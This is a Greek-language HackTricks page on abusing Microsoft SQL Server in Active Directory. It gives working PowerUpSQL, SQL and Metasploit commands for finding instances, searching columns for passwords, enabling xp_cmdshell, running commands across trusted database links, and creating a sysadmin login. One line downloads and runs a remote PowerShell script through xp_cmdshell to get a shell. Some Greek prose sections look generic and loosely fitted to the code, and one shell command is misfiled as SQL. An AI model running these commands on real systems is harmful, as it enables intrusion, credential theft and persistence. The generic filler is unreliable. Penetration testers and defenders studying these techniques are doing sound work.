# Κατάχρηση MSSQL AD

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Απαρίθμηση / Ανακάλυψη MSSQL**

Το powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) είναι πολύ χρήσιμο σε αυτήν την περίπτωση.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα

Για να πραγματοποιήσουμε απαρίθμηση από το δίκτυο χωρίς συνεδρία τομέα, μπορούμε να ακολουθήσουμε τα παρακάτω βήματα:

1. Χρησιμοποιούμε το εργαλείο `nmap` για να εντοπίσουμε τους διαθέσιμους υπολογιστές στο δίκτυο.
2. Εκτελούμε την εντολή `nmap -p 1433 --open -sV <IP>` για να ελέγξουμε αν οι υπολογιστές αποκρίνονται στη θύρα 1433, η οποία είναι η προεπιλεγμένη θύρα για το Microsoft SQL Server.
3. Αν εντοπίσουμε υπολογιστές που αποκρίνονται, χρησιμοποιούμε το εργαλείο `mssql-cli` για να συνδεθούμε στον SQL Server.
4. Εκτελούμε ερωτήματα SQL για να αποκτήσουμε πληροφορίες για τη βάση δεδομένων, τους πίνακες και τα δεδομένα που περιέχονται σε αυτήν.
5. Αναλύουμε τα αποτελέσματα για να εντοπίσουμε ευπάθειες ή πιθανές ευκαιρίες για εκμετάλλευση.

Με αυτόν τον τρόπο, μπορούμε να πραγματοποιήσουμε απαρίθμηση από το δίκτυο χωρίς να απαιτείται συνεδρία τομέα.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Απαρίθμηση από μέσα στον τομέα

Για να απαριθμήσουμε τον τομέα από μέσα, μπορούμε να χρησιμοποιήσουμε τις παρακάτω τεχνικές:

1. **Ανάλυση DNS**: Ελέγξτε τις καταχωρήσεις DNS για να ανακτήσετε πληροφορίες για τον τομέα, όπως τα ονόματα των υπηρεσιών και των υπολογιστών.

2. **Ανάλυση LDAP**: Χρησιμοποιήστε το πρωτόκολλο LDAP για να ανακτήσετε πληροφορίες για τους χρήστες, τις ομάδες και τις μονάδες οργάνωσης του τομέα.

3. **Ανάλυση SMB**: Ελέγξτε το πρωτόκολλο SMB για να ανακτήσετε πληροφορίες για τους κοινόχρηστους φακέλους, τις εκτυπωτές και τις ρυθμίσεις ασφαλείας του τομέα.

4. **Ανάλυση MSSQL**: Εκτελέστε ερωτήματα SQL στη βάση δεδομένων MSSQL για να ανακτήσετε πληροφορίες για τους πίνακες, τις αποθηκευμένες διαδικασίες και τα δικαιώματα πρόσβασης.

5. **Ανάλυση Kerberos**: Ελέγξτε το πρωτόκολλο Kerberos για να ανακτήσετε πληροφορίες για τους χρήστες, τις υπηρεσίες και τα εισιτήρια αυθεντικοποίησης του τομέα.

Αυτές οι τεχνικές μπορούν να σας βοηθήσουν να αποκτήσετε πληροφορίες για τον τομέα από μέσα, προκειμένου να εντοπίσετε ευπάθειες και να προχωρήσετε σε περαιτέρω επιθέσεις.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## Βασική Κατάχρηση του MSSQL

### Πρόσβαση στη Βάση Δεδομένων

Για να αποκτήσουμε πρόσβαση σε μια βάση δεδομένων MSSQL, μπορούμε να ακολουθήσουμε τα παρακάτω βήματα:

1. Ελέγξτε αν έχετε πρόσβαση στον SQL Server.
2. Χρησιμοποιήστε το εργαλείο `sqlcmd` για να συνδεθείτε στον SQL Server.
3. Εκτελέστε εντολές SQL για να αποκτήσετε πρόσβαση στη βάση δεδομένων.

Παρακάτω παρατίθενται παραδείγματα εντολών SQL που μπορείτε να χρησιμοποιήσετε:

```sql
-- Σύνδεση στον SQL Server
sqlcmd -S <server> -U <username> -P <password>

-- Εμφάνιση όλων των βάσεων δεδομένων
SELECT name FROM sys.databases;

-- Επιλογή μιας συγκεκριμένης βάσης δεδομένων
USE <database_name>;

-- Εμφάνιση όλων των πινάκων στη βάση δεδομένων
SELECT name FROM sys.tables;

-- Εκτέλεση μιας εντολής SQL
EXEC sp_executesql N'<sql_command>';
```

Ακολουθώντας αυτά τα βήματα, μπορείτε να αποκτήσετε πρόσβαση σε μια βάση δεδομένων MSSQL και να εκτελέσετε εντολές SQL για να ανακτήσετε πληροφορίες ή να πραγματοποιήσετε αλλαγές.
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Είναι επίσης πιθανό να εκτελέσετε εντολές μέσα στον κεντρικό υπολογιστή MSSQL.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Ελέγξτε στη σελίδα που αναφέρεται στο **επόμενο τμήμα πώς να το κάνετε χειροκίνητα**.

### Βασικά Κόλπα Χάκινγκ στο MSSQL

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Εμπιστευμένοι Συνδέσμοι MSSQL

Εάν ένα παράδειγμα MSSQL είναι εμπιστευμένο (σύνδεση βάσης δεδομένων) από ένα διαφορετικό παράδειγμα MSSQL. Εάν ο χρήστης έχει δικαιώματα στην εμπιστευμένη βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στο άλλο παράδειγμα**. Αυτές οι εμπιστοσύνες μπορούν να αλυσοδεθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια κακοδιαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.

**Οι συνδέσεις μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και μεταξύ εμπιστευμένων δασών.**

### Κατάχρηση Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Μπορείτε εύκολα να ελέγξετε για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Παρατηρήστε ότι το metasploit θα προσπαθήσει να καταχραστεί μόνο την λειτουργία `openquery()` στο MSSQL (επομένως, αν δεν μπορείτε να εκτελέσετε εντολές με την `openquery()`, θα πρέπει να δοκιμάσετε τη μέθοδο `EXECUTE` **χειροκίνητα** για να εκτελέσετε εντολές, δείτε περισσότερα παρακάτω.)

### Χειροκίνητο - Openquery()

Από **Linux** μπορείτε να αποκτήσετε ένα κέλυφος κονσόλας MSSQL με τα εργαλεία **sqsh** και **mssqlclient.py.**

Από **Windows** μπορείτε επίσης να βρείτε τους συνδέσμους και να εκτελέσετε εντολές χειροκίνητα χρησιμοποιώντας έναν **πελάτη MSSQL όπως** [**HeidiSQL**](https://www.heidisql.com)

_Σύνδεση χρησιμοποιώντας ταυτοποίηση Windows:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Εύρεση αξιόπιστων συνδέσμων
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο

Εκτελέστε ερωτήματα μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στη νέα προσβάσιμη περίπτωση):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Ελέγξτε πού χρησιμοποιούνται διπλά και μονά εισαγωγικά, είναι σημαντικό να τα χρησιμοποιείτε με αυτόν τον τρόπο.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Μπορείτε να συνεχίσετε αυτήν την αλυσίδα αξιόπιστων συνδέσμων για πάντα με το χέρι.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Εάν δεν μπορείτε να εκτελέσετε ενέργειες όπως `exec xp_cmdshell` από το `openquery()`, δοκιμάστε με τη μέθοδο `EXECUTE`.

### Εγχειρίδιο - EXECUTE

Μπορείτε επίσης να καταχραστείτε τους αξιόπιστους συνδέσμους χρησιμοποιώντας τη μέθοδο `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Ανέλιξη Τοπικών Προνομιών

Ο τοπικός χρήστης **MSSQL** συνήθως έχει έναν ειδικό τύπο προνομίου που ονομάζεται **`SeImpersonatePrivilege`**. Αυτό επιτρέπει στον λογαριασμό να "υποκαταστήσει έναν πελάτη μετά την πιστοποίηση".

Μια στρατηγική που πολλοί συγγραφείς έχουν αναπτύξει είναι να αναγκάσουν έναν υπηρεσία του συστήματος να πιστοποιηθεί σε μια ψεύτικη ή man-in-the-middle υπηρεσία που δημιουργεί ο επιτιθέμενος. Αυτή η ψεύτικη υπηρεσία μπορεί στη συνέχεια να υποκαταστήσει την υπηρεσία του συστήματος ενώ προσπαθεί να πιστοποιηθεί.

Το [SweetPotato](https://github.com/CCob/SweetPotato) περιλαμβάνει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελεστούν μέσω της εντολής `execute-assembly` του Beacon.

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
